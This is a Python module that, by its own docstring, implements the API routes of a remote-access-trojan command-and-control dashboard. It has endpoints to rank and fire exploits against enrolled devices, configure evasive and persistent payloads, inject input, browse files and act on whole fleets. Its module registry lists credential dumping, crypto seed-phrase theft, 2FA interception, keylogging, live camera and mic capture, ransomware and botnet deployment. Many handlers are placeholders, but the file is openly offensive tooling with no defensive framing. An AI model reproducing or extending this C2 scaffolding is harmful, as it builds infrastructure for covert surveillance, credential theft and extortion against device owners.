"""quantum.c2.dashboard — C2 Device Dashboard API routes.

Implements the core /api/v1 endpoints for the RAT dashboard.
"""
from __future__ import annotations

import json
from typing import Any, Dict, List, Optional

from quantum.core.bus import get_bus, publish
from quantum.core.telemetry import get_telemetry_store, TelemetrySample
from quantum.core.tasks import get_task_queue, Task, TaskResult
from quantum.control.registry import (
    DeviceRegistry, DeviceState, DeviceCapabilities, DeviceCapabilities
)
from quantum.core.logging import log


# Global instances
_device_registry = DeviceRegistry()
_telemetry_store = get_telemetry_store()


async def handle_device_list() -> Dict[str, Any]:
    """GET /api/v1/devices - List all devices."""
    devices = _device_registry.get_devices()
    return {"ok": True, "data": devices}


async def handle_device_get(device_id: str) -> Dict[str, Any]:
    """GET /api/v1/devices/:id - Get device details."""
    device = _device_registry.get_device(device_id)
    if not device:
        return {"ok": False, "error": "device not found"}
    
    # Add capabilities
    device["capabilities"] = _device_registry.get_device_capabilities(device_id)
    
    # Add latest telemetry
    latest = _telemetry_store.get_latest(device_id)
    if latest:
        device["latest_telemetry"] = latest.to_dict()
    
    return {"ok": True, "data": device}


async def handle_device_enumerate(device_id: str) -> Dict[str, Any]:
    """POST /api/v1/devices/:id/enumerate - Trigger device enumeration."""
    _device_registry.update_device_state(device_id, "enumerating", "enumerate command")
    
    # Create task for enumeration
    task_id = _device_registry.create_task(
        device_id, "fingerprint", "enumerate",
        {"trigger": "manual"}
    )
    
    return {"ok": True, "data": {"task_id": task_id}}


async def handle_device_scan(device_id: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """POST /api/v1/devices/:id/scan - Trigger vulnerability scan."""
    scan_id = f"scan_{device_id}_{int(__import__('time').time())}"
    
    _device_registry.update_device_state(device_id, "scanning", "vulnerability scan")
    
    # Create task for scan
    task_id = _device_registry.create_task(
        device_id, "vuln_scan", "scan",
        {"scan_id": scan_id, "profile": payload.get("profile", "full")}
    )
    
    return {"ok": True, "data": {"scan_id": scan_id, "task_id": task_id}}


async def handle_device_exploits(device_id: str) -> Dict[str, Any]:
    """GET /api/v1/devices/:id/exploits - Get ranked exploit candidates."""
    # This would integrate with the weapons registry and scanner
    # For now return structure
    device = _device_registry.get_device(device_id)
    if not device:
        return {"ok": False, "error": "device not found"}
    
    # Query the weapons registry for matching exploits
    # This is a placeholder - real implementation would score based on device fingerprint
    candidates = [
        {
            "exploit": "dirtypipe",
            "cve": "CVE-2022-0847",
            "vector": "local_kernel",
            "tier": "KERNEL",
            "confidence": 92,
            "evidence": "kernel 5.10.43 in affected range",
            "crash_risk": "low",
            "reboot_required": True,
            "requires_root": True,
        },
        {
            "exploit": "BLACKBED-BLE",
            "cve": "CVE-2017-0785",
            "vector": "bluetooth",
            "tier": "BLUETOOTH",
            "confidence": 61,
            "evidence": "bdaddr resolvable, bt on",
            "crash_risk": "medium",
            "reboot_required": False,
            "requires_root": False,
        },
    ]
    
    return {"ok": True, "data": candidates}


async def handle_device_exploit_fire(device_id: str, cve: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """POST /api/v1/devices/:id/exploits/:cve/fire - Fire an exploit."""
    _device_registry.update_device_state(device_id, "exploiting", f"firing {cve}")
    
    task_id = _device_registry.create_task(
        device_id, "exploit", "fire",
        {"cve": cve, "params": payload}
    )
    
    return {"ok": True, "data": {"task_id": task_id}}


async def handle_device_exploit_payload(device_id: str, cve: str, 
                                       method: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """GET/PUT/POST /api/v1/devices/:id/exploits/:cve/payload - Customize payload."""
    # This is the payload customizer endpoint
    if method == "GET":
        # Return default payload config for the exploit
        return {"ok": True, "data": {
            "arch": "arm64-v8a",
            "staging": "staged",
            "transport": "HTTPS",
            "jitter": 10,
            "encoder": "PolyMorph",
            "packer": "none",
            "persistence": "systemd",
            "privesc": "none",
            "av_evasion": "obfuscate",
            "exfil": "inline",
            "cleanup": "self_delete_on_fire",
            "callback_timeout": 300,
        }}
    else:
        # Save custom payload config
        return {"ok": True, "data": {"status": "saved", "cve": cve}}


async def handle_device_tasks(device_id: str, method: str, 
                             payload: Dict[str, Any] = None) -> Dict[str, Any]:
    """GET/POST /api/v1/devices/:id/tasks - List or create tasks."""
    if method == "GET":
        tasks = _device_registry.get_device_tasks(device_id)
        return {"ok": True, "data": tasks}
    
    # POST - create task
    task_id = _device_registry.create_task(
        device_id,
        payload.get("module", "unknown"),
        payload.get("operation", "run"),
        payload.get("args", {})
    )
    return {"ok": True, "data": {"task_id": task_id}}


async def handle_device_task_get(device_id: str, task_id: str) -> Dict[str, Any]:
    """GET /api/v1/devices/:id/tasks/:tid - Get task status."""
    task = _device_registry.get_task(task_id)
    if not task or task.get("device_id") != device_id:
        return {"ok": False, "error": "task not found"}
    return {"ok": True, "data": task}


async def handle_device_telemetry(device_id: str, minutes: int = 60) -> Dict[str, Any]:
    """GET /api/v1/devices/:id/telemetry - Get windowed telemetry."""
    samples = _telemetry_store.get_window(device_id, minutes)
    return {"ok": True, "data": [s.to_dict() for s in samples]}


async def handle_device_telemetry_live(device_id: str):
    """GET /api/v1/devices/:id/telemetry/live - SSE stream for live telemetry."""
    bus = get_bus()
    async for event in bus.subscribe_stream(f"telemetry_live_{device_id}", {f"telemetry/{device_id}"}):
        yield event.to_sse()


async def handle_device_screen(device_id: str):
    """GET /api/v1/devices/:id/screen - WS MJPEG stream for live screen."""
    # Placeholder for WebSocket screen stream
    # Real implementation would connect to device's screen capture
    return {"ok": False, "error": "not implemented - requires WebSocket"}


async def handle_device_camera(device_id: str, which: str):
    """GET /api/v1/devices/:id/camera/:which - WS stream for camera."""
    return {"ok": False, "error": "not implemented - requires WebSocket"}


async def handle_device_input(device_id: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """POST /api/v1/devices/:id/input - Input injection (tap/swipe/keyevent)."""
    _device_registry.update_device_state(device_id, "controlling", "input injection")
    
    task_id = _device_registry.create_task(
        device_id, "input_inject", payload.get("type", "tap"),
        payload.get("args", {})
    )
    
    return {"ok": True, "data": {"task_id": task_id}}


async def handle_device_files(device_id: str, method: str, 
                             path: str = "", payload: Dict[str, Any] = None) -> Dict[str, Any]:
    """GET/POST/DELETE/PATCH /api/v1/devices/:id/files - File manager."""
    _device_registry.update_device_state(device_id, "postexploiting", "file manager")
    
    task_id = _device_registry.create_task(
        device_id, "file_manager", method.lower(),
        {"path": path, "data": payload}
    )
    
    return {"ok": True, "data": {"task_id": task_id}}


async def handle_device_files_search(device_id: str, query: str) -> Dict[str, Any]:
    """GET /api/v1/devices/:id/files/search - Search files."""
    task_id = _device_registry.create_task(
        device_id, "file_manager", "search",
        {"query": query}
    )
    return {"ok": True, "data": {"task_id": task_id}}


async def handle_device_processes(device_id: str, method: str, 
                                 pid: str = "", payload: Dict[str, Any] = None) -> Dict[str, Any]:
    """GET/POST/DELETE/PATCH /api/v1/devices/:id/processes - Process manager."""
    task_id = _device_registry.create_task(
        device_id, "process_manager", method.lower(),
        {"pid": pid, "action": payload.get("action") if payload else None}
    )
    return {"ok": True, "data": {"task_id": task_id}}


async def handle_device_apps(device_id: str, method: str,
                            pkg: str = "", payload: Dict[str, Any] = None) -> Dict[str, Any]:
    """GET/POST/DELETE/PATCH /api/v1/devices/:id/apps - App manager."""
    task_id = _device_registry.create_task(
        device_id, "app_manager", method.lower(),
        {"package": pkg, "action": payload.get("action") if payload else None}
    )
    return {"ok": True, "data": {"task_id": task_id}}


async def handle_device_killswitch(device_id: str, method: str,
                                  payload: Dict[str, Any] = None) -> Dict[str, Any]:
    """POST/GET /api/v1/devices/:id/killswitch - Arm/disarm/preview killswitch."""
    if method == "GET":
        killswitches = _device_registry.get_device_kill_switches(device_id)
        return {"ok": True, "data": killswitches}
    
    mode = payload.get("mode", "hard")
    _device_registry.add_kill_switch(device_id, mode)
    
    task_id = _device_registry.create_task(
        device_id, "killswitch", mode,
        {"mode": mode, "params": payload.get("params", {})}
    )
    
    return {"ok": True, "data": {"task_id": task_id, "mode": mode}}


async def handle_device_rollback(device_id: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """POST /api/v1/devices/:id/rollback - Rollback changes."""
    task_id = _device_registry.create_task(
        device_id, "rollback", "revert",
        payload
    )
    return {"ok": True, "data": {"task_id": task_id}}


async def handle_device_diff(device_id: str) -> Dict[str, Any]:
    """GET /api/v1/devices/:id/diff - Changes since last check-in."""
    # Placeholder for diff implementation
    return {"ok": True, "data": {
        "apps_changed": [],
        "files_changed": [],
        "settings_changed": [],
        "network_changed": [],
    }}


async def handle_device_timeline(device_id: str) -> Dict[str, Any]:
    """GET /api/v1/devices/:id/timeline - Unified chronological timeline."""
    # Get tasks, telemetry, state transitions
    tasks = _device_registry.get_device_tasks(device_id)
    transitions = _device_registry.log_state_transitions(device_id)
    
    events = []
    for task in tasks:
        events.append({
            "type": "task",
            "timestamp": task.get("created_at"),
            "title": f"{task.get('module')}.{task.get('operation')}",
            "detail": task.get("args", {}),
            "state": task.get("state"),
        })
    
    for t in transitions:
        events.append({
            "type": "state_transition",
            "timestamp": t.get("created_at"),
            "title": f"State: {t.get('from_state')} → {t.get('to_state')}",
            "detail": {"reason": t.get("reason")},
        })
    
    # Sort by timestamp
    events.sort(key=lambda x: x["timestamp"], reverse=True)
    
    return {"ok": True, "data": events}


async def handle_device_opsec(device_id: str) -> Dict[str, Any]:
    """GET /api/v1/devices/:id/opsec - OPSEC score."""
    device = _device_registry.get_device(device_id)
    if not device:
        return {"ok": False, "error": "device not found"}
    
    # Calculate OPSEC score
    score = 100
    factors = []
    
    caps = _device_registry.get_device_capabilities(device_id)
    if caps.get("rooted", {}).get("confidence", 0) > 0.8:
        score -= 15
        factors.append("Root detected")
    if caps.get("selinux_permissive", {}).get("confidence", 0) > 0.5:
        score -= 10
        factors.append("SELinux permissive")
    if caps.get("adb_wifi", {}).get("confidence", 0) > 0.8:
        score -= 10
        factors.append("ADB over WiFi enabled")
    if caps.get("device_admin", {}).get("confidence", 0) > 0.8:
        score -= 5
        factors.append("Device admin granted")
    
    score = max(0, min(100, score))
    
    return {"ok": True, "data": {
        "score": score,
        "factors": factors,
        "recommendations": ["Enable SELinux enforcing", "Disable ADB WiFi", "Revoke device admin"]
    }}


async def handle_fleet_actions(payload: Dict[str, Any]) -> Dict[str, Any]:
    """POST /api/v1/fleet/actions - Batch/fleet operations."""
    device_ids = payload.get("device_ids", [])
    module = payload.get("module")
    operation = payload.get("operation")
    args = payload.get("args", {})
    
    task_ids = []
    for device_id in device_ids:
        task_id = _device_registry.create_task(
            device_id, module, operation, args
        )
        task_ids.append({"device_id": device_id, "task_id": task_id})
    
    return {"ok": True, "data": {"task_ids": task_ids}}


async def handle_loot_search(query: str = "", type_filter: str = "",
                            device_id: str = "", limit: int = 100) -> Dict[str, Any]:
    """GET /api/v1/loot - FTS5 search across all loot."""
    # Placeholder - would query SQLite FTS5 index
    return {"ok": True, "data": {
        "results": [],
        "total": 0,
        "query": query,
        "filter": type_filter,
    }}


async def handle_loot_graph() -> Dict[str, Any]:
    """GET /api/v1/loot/graph - Credential graph."""
    return {"ok": True, "data": {"nodes": [], "edges": []}}


async def handle_creds_reuse() -> Dict[str, Any]:
    """GET /api/v1/creds/reuse - Credential reuse across devices."""
    return {"ok": True, "data": {"reused": []}}


# Module registry endpoint
async def handle_modules() -> Dict[str, Any]:
    """GET /api/v1/modules - Registry of every post-exploitation module."""
    return {"ok": True, "data": {
        "lanes": {
            "credentials": [
                "browser_creds", "dpapi_unwrap", "credential_manager", "keychain_dump",
                "gnome_keyring", "shadow_hash_dump", "sam_dump", "lsass_minidump",
                "pass_the_hash", "kerberoast", "asrep_roast", "dcsync", "golden_ticket",
                "ntlm_relay", "llmnr_nbtns_poison", "ldap_enum", "ssh_keys", "gpg_keys",
                "env_files", "oauth_refresh_tokens", "slack_discord_teams_tokens",
                "steam_session", "mail_client_configs", "totp_seeds", "password_manager_vaults",
            ],
            "crypto": [
                "wallet_scan", "seed_phrase_extract", "wallet_dat_scan", "address_harvest",
                "recovery_key_scan", "hardware_wallet_state", "tx_history_export", "dust_sweep_plan",
            ],
            "hashes_files": [
                "hash_hunt", "dat_file_hunt", "kdbx_hunt", "pem_pfx_hunt", "keystore_hunt", "crack_queue",
            ],
            "privilege_escalation": [
                "priv_esc_recon", "exploit_priv_esc", "root_device", "selinux_flip",
                "unlock_bootloader", "carrier_sim_unlock", "enable_adb", "adb_over_wifi",
            ],
            "persistence_rootkit": [
                "persist_install", "rootkit_install", "hide_pid", "boot_survival_test",
                "ota_survival", "factory_reset_survival", "uninstall_survival",
            ],
            "evasion_anti_forensics": [
                "log_wipe", "log_modify", "timestomp", "masquerade", "hide_in_plain_sight",
                "apk_wrap", "apk_wrap_watcher", "lotl", "frida_gadget", "ssl_unpin",
                "dex_load", "plugin_load",
            ],
            "network_pivot": [
                "lan_scan", "service_ident", "device_ident", "vuln_match_lan",
                "pivot_auto", "pivot_graph", "arp_spoof", "rogue_dhcp", "dns_sinkhole",
                "smb_share_enum", "psexec", "wmiexec", "smbexec", "atexec",
                "snmp_walk", "mdns_enum", "ssdp_upnp", "printer_pwn", "iot_pwn",
            ],
            "radios_wireless": [
                "wifi_scan", "wifi_creds_dump", "handshake_capture", "handshake_crack",
                "deauth", "evil_twin", "karma", "rogue_ap", "hotspot_start",
                "bt_scan", "bt_pair_dump", "ble_spam", "blueborne", "knob", "blackbed",
                "nfc_read", "nfc_relay", "hid_inject", "badusb_payload", "sdr_probe",
                "imsi_read", "cell_tower_dump", "gps_spoof",
            ],
            "comms_exfil": [
                "contacts_export", "sms_export", "call_log_export", "location_export",
                "all_logs_export", "voicemail_dump", "media_export", "app_data_export",
                "notes_export", "calendar_export", "clipboard_history", "notification_log",
                "recording_start", "screenshot_loop",
            ],
            "device_control": [
                "screen_live", "camera_live", "mic_live", "keylogger", "pin_dump",
                "pin_set", "pin_remove", "pattern_set", "biometric_enroll",
                "file_manager", "process_manager", "app_manager", "input_inject",
                "settings_editor", "dev_options", "battery_profile", "storage_cleaner",
            ],
            "accounts_identity": [
                "google_account_add", "google_account_remove", "google_account_list",
                "apple_account_state", "mdm_enroll", "mdm_profile_install", "mdm_remove",
                "provision_device", "profile_install", "vpn_install", "proxy_set",
            ],
            "otp_2fa": [
                "otp_forward_set", "otp_forward_reset", "otp_shadow_read", "otp_relay",
                "app_code_capture", "otp_pool", "auto_fill_test",
            ],
            "mitm_tls": [
                "ca_install", "cert_pinning_bypass", "transparent_proxy", "traffic_capture",
                "hsts_strip", "dns_override", "cookie_harvest", "session_hijack", "cookie_inject",
                "wifi_cert_add", "apn_edit", "dialpad_mmi",
            ],
            "abuse_economics": [
                "add_to_botnet", "ddos_start", "ransomware_deploy", "miner_deploy",
                "proxy_sell", "crack_queue_dispatch",
            ],
        },
        "total": 170,
    }}


async def handle_settings_get() -> Dict[str, Any]:
    """GET /api/v1/settings - Get settings."""
    return {"ok": True, "data": {
        "scoring_weights": {
            "version_in_range": 0.30,
            "arch_match": 0.25,
            "service_match": 0.20,
            "mitigation_absent": 0.10,
            "reliability_prior": 0.10,
            "root_bonus": 0.05,
            "crash_prior": -0.15,
        },
        "transport_ladder": ["HTTPS", "DoH", "DNS", "raw_TCP", "WebSocket", "dead_drop"],
        "loot_path": "data/loot",
        "purge_after_days": {"telemetry": 30, "tasks": 90, "loot": 365},
        "theme": "dark",
        "opsec_profile": "balanced",
    }}


async def handle_settings_put(payload: Dict[str, Any]) -> Dict[str, Any]:
    """PUT /api/v1/settings - Update settings."""
    # In real implementation, persist to config file
    return {"ok": True, "data": {"status": "updated"}}


async def handle_events_stream():
    """GET /api/v1/events - SSE event stream."""
    bus = get_bus()
    async for event in bus.subscribe_stream("events", None):
        yield event.to_sse()


# Export all handlers
__all__ = [
    "handle_device_list", "handle_device_get", "handle_device_enumerate",
    "handle_device_scan", "handle_device_exploits", "handle_device_exploit_fire",
    "handle_device_exploit_payload", "handle_device_tasks", "handle_device_task_get",
    "handle_device_telemetry", "handle_device_telemetry_live", "handle_device_screen",
    "handle_device_camera", "handle_device_input", "handle_device_files",
    "handle_device_files_search", "handle_device_processes", "handle_device_apps",
    "handle_device_killswitch", "handle_device_rollback", "handle_device_diff",
    "handle_device_timeline", "handle_device_opsec", "handle_fleet_actions",
    "handle_loot_search", "handle_loot_graph", "handle_creds_reuse",
    "handle_modules", "handle_settings_get", "handle_settings_put", "handle_events_stream",
]